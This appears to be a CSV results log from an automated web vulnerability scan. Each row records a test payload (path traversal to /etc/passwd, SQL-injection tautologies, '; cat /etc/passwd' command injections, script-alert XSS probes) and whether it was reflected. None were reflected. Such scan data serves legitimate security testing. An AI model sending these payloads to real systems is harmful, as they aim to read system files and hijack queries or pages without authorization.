payload,reflected,error
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
' OR 170=170 --,False,
../../../../../../../../../../../../../../../../etc/passwd,False,
; cat /etc/passwd #177,False,
; cat /etc/passwd #8,False,
; cat /etc/passwd #63,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
; cat /etc/passwd #144,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
<script>alert(39)</script>,False,
; cat /etc/passwd #165,False,
' OR 186=186 --,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
' OR 55=55 --,False,
' OR 144=144 --,False,
<script>alert(62)</script>,False,
<script>alert(4)</script>,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
; cat /etc/passwd #20,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
<script>alert(200)</script>,False,
<script>alert(126)</script>,False,
; cat /etc/passwd #27,False,
<script>alert(28)</script>,False,
<script>alert(16)</script>,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
; cat /etc/passwd #91,False,
; cat /etc/passwd #30,False,
; cat /etc/passwd #60,False,
' OR 100=100 --,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
<script>alert(20)</script>,False,
' OR 135=135 --,False,
<script>alert(79)</script>,False,
<script>alert(193)</script>,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
<script>alert(190)</script>,False,
; cat /etc/passwd #130,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
<script>alert(38)</script>,False,
' OR 112=112 --,False,
; cat /etc/passwd #117,False,
../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../../etc/passwd,False,
; cat /etc/passwd #114,False,
; cat /etc/passwd #69,False,
' OR 25=25 --,False,
<script>alert(182)</script>,False,
; cat /etc/passwd #103,False,
